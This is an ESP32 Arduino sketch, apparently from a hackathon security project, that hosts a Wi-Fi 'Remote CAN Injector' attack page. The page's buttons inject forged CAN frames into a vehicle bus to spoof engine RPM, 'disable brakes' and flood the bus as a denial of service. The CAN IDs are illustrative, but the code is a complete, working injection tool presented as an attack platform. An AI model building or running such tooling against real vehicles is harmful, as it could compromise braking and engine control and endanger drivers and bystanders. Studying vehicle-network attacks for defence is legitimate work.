#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <mcp2515.h>

// --- Configuration ---
const char* ssid = "Aegis_Attacker";
const char* password = "hackathon";

// ESP32-S3 default SPI pins
#define SPI_CS_PIN    10
#define SPI_MOSI_PIN  11
#define SPI_MISO_PIN  13
#define SPI_SCK_PIN   12

MCP2515 mcp2515(SPI_CS_PIN);
WebServer server(80);

// --- Hacker Web UI (HTML/CSS/JS) ---
// We store this in flash memory (PROGMEM) to save RAM.
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>AEGIS-CPS // ATTACK PLATFORM</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 20px; }
        h1 { color: #ff003c; border-bottom: 2px solid #ff003c; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
        .container { max-width: 600px; margin: auto; }
        .btn { display: block; width: 100%; padding: 15px; margin: 15px 0; font-size: 18px; font-weight: bold; color: white; background-color: #220000; border: 2px solid #ff003c; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .btn:hover { background-color: #ff003c; color: #000; box-shadow: 0 0 15px #ff003c; }
        .btn:active { background-color: #ffffff; }
        #terminal { background-color: #000; border: 1px solid #333; padding: 15px; height: 150px; overflow-y: auto; text-align: left; margin-top: 30px; box-shadow: inset 0 0 10px #00ff0033; }
        .log-entry { margin: 5px 0; }
        .error { color: #ff003c; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Remote CAN Injector</h1>
        <p>Target: Vehicle CAN Bus (500 kbps)</p>
        
        <button class="btn" onclick="attack('rpm')">Inject: Spoof RPM to MAX (0x100)</button>
        <button class="btn" onclick="attack('brakes')">Inject: Disable Brakes (0x050)</button>
        <button class="btn" onclick="attack('dos')">Flood: Bus Denial of Service (0x000)</button>
        
        <div id="terminal">
            <div class="log-entry">root@aegis-attacker:~# Connected to CAN bus.</div>
            <div class="log-entry">root@aegis-attacker:~# Ready to inject frames...</div>
        </div>
    </div>

    <script>
        function logMsg(msg, isError = false) {
            const terminal = document.getElementById('terminal');
            const entry = document.createElement('div');
            entry.className = 'log-entry' + (isError ? ' error' : '');
            entry.innerText = 'root@aegis-attacker:~# ' + msg;
            terminal.appendChild(entry);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function attack(type) {
            logMsg('Executing payload: ' + type + '...');
            fetch('/attack?type=' + type)
                .then(response => response.text())
                .then(data => logMsg(data))
                .catch(error => logMsg('Link failed.', true));
        }
    </script>
</body>
</html>
)rawliteral";

// --- Endpoints ---
void handleRoot() {
    server.send(200, "text/html", index_html);
}

void handleAttack() {
    if (!server.hasArg("type")) {
        server.send(400, "text/plain", "Missing payload type");
        return;
    }
    
    String type = server.arg("type");
    struct can_frame frame;
    String responseMsg = "";

    if (type == "rpm") {
        // Spoof Engine RPM (e.g., ID 0x100)
        frame.can_id = 0x100;
        frame.can_dlc = 8;
        frame.data[0] = 0xFF; // Max RPM
        frame.data[1] = 0xFF;
        for (int i = 2; i < 8; i++) frame.data[i] = 0x00;
        
        mcp2515.sendMessage(&frame);
        responseMsg = "SUCCESS: Frame 0x100 (Max RPM) injected into bus.";
        Serial.println("Sent RPM Attack");

    } else if (type == "brakes") {
        // Spoof Brake Controller (e.g., ID 0x050)
        frame.can_id = 0x050;
        frame.can_dlc = 8;
        for (int i = 0; i < 8; i++) frame.data[i] = 0x00; // Zero out brakes
        
        mcp2515.sendMessage(&frame);
        responseMsg = "SUCCESS: Frame 0x050 (Disable Brakes) injected into bus.";
        Serial.println("Sent Brake Attack");

    } else if (type == "dos") {
        // Denial of Service: Flood the bus with dominant ID (0x000)
        frame.can_id = 0x000;
        frame.can_dlc = 8;
        for (int i = 0; i < 8; i++) frame.data[i] = 0x00;
        
        // Send 50 frames rapidly
        for (int i = 0; i < 50; i++) {
            mcp2515.sendMessage(&frame);
            delay(1);
        }
        responseMsg = "SUCCESS: 50 Dominant frames (0x000) flooded.";
        Serial.println("Sent DoS Attack");

    } else {
        responseMsg = "ERROR: Unknown payload.";
    }

    server.send(200, "text/plain", responseMsg);
}

void setup() {
    Serial.begin(115200);
    Serial.println("Starting Aegis-CPS Attacker UI...");

    // Setup SPI for ESP32-S3 explicitly
    SPI.begin(SPI_SCK_PIN, SPI_MISO_PIN, SPI_MOSI_PIN, SPI_CS_PIN);
    
    // Initialize MCP2515
    mcp2515.reset();
    // NOTE: If your MCP2515 module crystal is 8MHz, use MCP_8MHZ. If 16MHz, use MCP_16MHZ.
    mcp2515.setBitrate(CAN_500KBPS, MCP_8MHZ); 
    mcp2515.setNormalMode();

    // Start Wi-Fi Access Point
    WiFi.softAP(ssid, password);
    IPAddress IP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(IP);

    // Setup Web Server Routes
    server.on("/", handleRoot);
    server.on("/attack", handleAttack);
    
    server.begin();
    Serial.println("HTTP Server Started.");
}

void loop() {
    server.handleClient();
}
